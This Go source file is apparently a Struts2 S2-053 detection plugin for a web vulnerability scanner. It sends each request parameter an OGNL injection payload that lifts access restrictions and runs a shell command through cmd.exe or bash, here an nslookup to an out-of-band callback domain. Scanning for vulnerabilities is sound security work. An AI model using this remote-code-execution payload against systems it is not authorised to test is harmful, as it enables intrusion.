package webapp

import (
	"errors"
	"fmt"
	"glint/config"
	"glint/logger"
	"glint/nenet"
	"glint/pkg/layers"
	"glint/plugin"
	reverse2 "glint/reverse"
	"glint/util"
	"time"
)

func (uf *UPFile) startTesting053() bool {

	if uf.variations != nil {
		for idx, _ := range uf.variations.Params {
			flag := util.RandLetterNumbers(6)
			acuserver := fmt.Sprintf("http://%s.%s", flag, config.CeyeDomain)
			reverse := reverse2.NewReverse1(config.CeyeDomain, flag)

			var payload_nslookup = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='nslookup " +
				acuserver + " ns1." + acuserver +
				"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"

			features, err := uf.lastJob.RequestByIndex(idx, uf.targetURL, []byte(payload_nslookup))
			if err != nil {
				logger.Error("%s", err)
			}
			features.Request.CopyTo(&uf.trueFeatures.Request)
			features.Response.CopyTo(&uf.trueFeatures.Response)
			// uf.trueFeatures.Request = features.Request
			// uf.trueFeatures.Response = features.Response
			if reverse2.ReverseCheck(reverse, 4) {
				uf.foundVulnOnVariation = true
				uf.VulnPayload = payload_nslookup
				return true
			}
		}
	}

	return false
}

func Struts2_053_Vaild(args *plugin.GroupData) (*util.ScanResult, bool, error) {
	var variations *util.Variations
	var cupFile UPFile
	//var hostid int64
	gd := args
	// var blastIters interface{}
	util.Setup()
	var Param layers.PluginParam
	// layers.Init()
	ct := layers.CheckType{IsMultipleUrls: false}
	Param.ParsePluginParams(args, ct)
	if Param.CheckForExitSignal() {
		return nil, false, errors.New("receive task exit signal")
	}

	sess := nenet.GetSessionByOptions(
		&nenet.ReqOptions{
			Timeout:       60 * time.Second,
			RetryTimes:    Param.MaxRedirectTimes,
			AllowRedirect: false,
			Proxy:         Param.UpProxy,
			Cert:          Param.Cert,
			PrivateKey:    Param.CertKey,
		})

	cupFile.lastJob.Init(Param)
	// variations, err = util.ParseUri(url)
	// BlindSQL.variations =
	if value, ok := Param.Headers["Content-Type"]; ok {
		Param.ContentType = value
	}

	variations, err := util.ParseUri(Param.Url, []byte(Param.Body), Param.Method, Param.ContentType, Param.Headers)
	if err != nil {
		// logger.Error(err.Error())
		return nil, false, errors.New("not found")
	}
	//赋值
	cupFile.variations = variations
	cupFile.targetURL = Param.Url
	extendLastJobLayer(&cupFile, sess, Param)

	fmt.Println(variations.Params)

	//先搜索回复里面的文件
	if cupFile.startTesting053() {
		Result := util.VulnerableTcpOrUdpResult(Param.Url,
			"Struts2_S2053 Vulnerable",
			[]string{string(cupFile.trueFeatures.Request.String())},
			[]string{string(cupFile.trueFeatures.Response.String())},
			"high",
			Param.Hostid, string(plugin.Struts2))
		gd.Alert(Result)
		return Result, true, nil
	}

	return nil, false, errors.New("not found")

}
